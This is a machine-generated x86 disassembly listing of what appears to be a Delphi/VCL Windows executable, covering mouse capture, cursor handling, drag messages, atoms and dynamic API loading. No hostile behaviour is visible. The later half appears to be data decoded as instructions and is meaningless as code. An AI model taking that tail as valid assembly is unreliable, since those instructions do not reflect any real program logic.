call sub_446034
call sub_445fd4
mov bl 0x1
jmp r-xdata
sub_447ef4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4462a8
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412cac
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446a9c
test eax eax
je r-xdata
push ebp
call sub_447d3c
pop ecx
push ebp
call sub_447dbc
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_447cc0
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_447f7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_445b28
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_445b28
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_447c70
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_447c70
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44800c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4483e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406948
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_446a9c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_447a40
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406948
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_446a9c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43cfc8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4483eb
lea eax [ ebp - 0x48 ]
call sub_403ef8
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443c60
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43bce4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43e178
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ef8
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_447ef4
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_442790
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_447af4
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406948
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_447f7c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_447af4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406948
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_446a9c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43d3a4
jmp r-xdata
mov eax edi
call sub_459c24
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_446a9c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ce24
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43d484
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f4c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4479e0
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443c60
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43db20
jmp r-xdata
sub_4483f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403448
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_448568
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_448484
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448540
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4484e8
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_448518
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406a34
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_448540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4484b4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_448568
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4484cc
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4484e8
pop ebx
retn
mov eax ebx
call sub_448518
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4485cc
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448732
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_448850
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_448834
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_448834
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_448940
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403124
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403124
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403124
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403124
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403ef8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403ef8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4489c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448b40
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f4c
mov eax [ rw-data ]
call sub_4043b8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f4c
mov eax [ rw-data ]
call sub_4043b8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4043b8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414374
mov [ rw-data ] eax
call sub_4485cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4483f4
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ac00
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bce4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45d8cc
mov ecx r-xdata
mov edx sub_43a540
mov eax [ r-xdata ]
call sub_413ad0
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b47
lea eax [ ebp - 0x10 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_448b92
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448bf3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448bfa
retn
mov eax rw-data
call sub_40d1c0
call sub_448940
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
call sub_403ef8
mov eax rw-data
call sub_403ef8
sub_448bfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448c82
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c89
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4489c8
mov eax [ r-xdata ]
call sub_413944
mov eax [ r-xdata ]
call sub_4139e4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
sub_448ed8
inc esp
add ah al
xchg esi eax
inc esp
add al cl
cwde
inc esp
add al ch
cwde
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
mov al 0x8d
inc esp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
clc
mov es [ eax + eax + 0x8 ]
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xa3940006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ esi + edx * 4 ] ch
xor [ ebx ] 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
arpl [ ebp + 0x74 ] si
mov [ gs : 0x600041 ] dl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
insd
popad
jae r-xdata
add [ eax + 0x49060002 ] al
lea eax [ eax + eax + 0x58 ]
add [ eax ] al
dec [ eax ]
cdq
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
mov [ gs : r--data ] dl
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x69 ] dl
inc esp
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add al al
xchg ebp eax
inc esp
add ah dl
xchg edi eax
inc esp
add [ eax ] dl
xchg edi eax
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc esp
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shr [ edx ] 0x1
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x8f700000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x448f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6800448f ] ch
add [ eax ] al
add [ eax - 0x72 ] cl
inc esp
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
sub al 0x96
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
or al 0x60
je r-xdata
xor eax [ eax ]
je r-xdata
inc ebx
push 0x65676e61
mov al 0x8d
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc ecx
add [ ebp + 0x5dd80041 ] dl
inc ecx
add al dl
inc ecx
add [ esi + 0x41 ] al
add [ eax ] bl
mov eax [ 0x60740044 ]
inc ecx
add al ch
push ecx
inc ecx
add [ eax ] dl
popad
inc ecx
add [ eax + 0x61 ] dl
inc ecx
add [ ecx + 0x56380041 ] bh
inc ecx
add [ ebx + 0x41 ] cl
add ah cl
pop eax
inc ecx
add [ eax - 0x77ffbea7 ] ah
arpl [ ecx ] ax
cwde
arpl [ ecx ] ax
add al 0x5a
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ ebx + ebx * 2 ] al
inc ecx
add [ esp + ebx * 2 + 0x5cf40041 ] bl
inc ecx
add [ eax - 0x27ffbea3 ] cl
pushad
inc ecx
add ah dh
pushad
inc ecx
add ah ch
arpl [ ecx ] ax
cmp al 0x62
inc ecx
add ah bh
inc ecx
add [ esi ] cl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax - 0x5fffbead ] ch
push edx
inc ecx
add [ edx + 0x62e80041 ] dh
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax ] cl
inc ecx
add ah ch
bound eax [ ecx ]
popad
je r-xdata
add al bl
inc ebx
jne r-xdata
inc ecx
add al dh
bound eax [ ecx ]
mov [ esi + 0x41 ] ss
add [ esp + 0x41 ] ah
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 + 0x300044 ] dl
add [ eax ] al
mov ah 0x20
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
lea eax [ eax ]
cld
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4491 ] ch
inc eax
add ah dh
0x9b440044 0x44
hlt
dec esp
imul esi [ ebx + 0x74 ] 0x91a8c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
int3
inc ebx
jne r-xdata
add [ eax ] ch
mov ah 0x41
add [ esp + edx * 4 ] dl
inc esp
add [ eax ] dl
mov al [ 0xffffffffb2040044 ]
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
and [ ecx ] eax
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x17ffbb66 ] ah
mov ah 0x41
add [ esp + esi * 4 - 0x4bdfffbf ] cl
inc ecx
add [ eax - 0x4c ] dl
inc ecx
add [ esp + esi * 4 ] ah
inc ecx
add [ eax - 0x6b ] ch
inc esp
add [ eax ] bh
sahf
inc esp
add al dl
popfd
inc esp
add [ ecx ] cl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
js r-xdata
add al 0xb2
xor [ eax ] al
hlt
dec esp
imul esi [ ebx + 0x74 ] 0x92180000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 + 0x44 ] ch
add [ eax + 0x4492 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x63ffbb6e ] cl
xchg edx eax
inc esp
add [ eax - 0x74000000 ] ah
mov [ eax + eax - 0x14 ] es
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add al [ eax ]
out dx al
sub_449292
out dx eax
[ eax + 0x44 ]
add [ eax + 0x540d0044 ] al
inc ebx
jne r-xdata
mov esp 0xd8004030
xor [ eax ] al
fdiv [ edx - 0x4d2bffbf ]
inc ecx
je r-xdata
js r-xdata
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] bh
add [ eax - 0x7bffbb66 ] al
0x9a880044 0x44
mov [ edx - 0x656fffbc ] ds
inc esp
add [ edx + ebx * 4 - 0x6567ffbc ] dl
inc esp
add [ edx + ebx * 4 + 0x540b0044 ] bl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5e85653
mov eax [ 0xffffffffda8bfffb ]
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
add [ ebx + esi * 4 ] cl
inc ecx
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al bl
mov dl 0x41
add ah dl
mov dl 0x41
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov al 0x92
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
mov bl 0x41
add [ eax - 0x4d ] bh
inc ecx
add [ eax - 0x43ffbb67 ] ch
cdq
inc esp
add al dl
cdq
inc esp
add ah ah
cdq
inc esp
add al bh
cdq
inc esp
add [ edx + ebx * 4 ] cl
inc esp
add [ eax ] ah
0x9a340044 0x44
dec eax
0x9a5c0044 0x44
jo r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b3c8
test bl bl
jle r-xdata
mov edx esi
call sub_4497b8
add [ ebx + esi * 4 + 0x41 ] ch
add [ eax - 0x4d ] al
inc ecx
add [ eax - 0x4d ] dh
inc ecx
add [ eax + 0x240041b2 ] dl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ edx - 0x729fffbc ] dl
inc esp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x93200000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
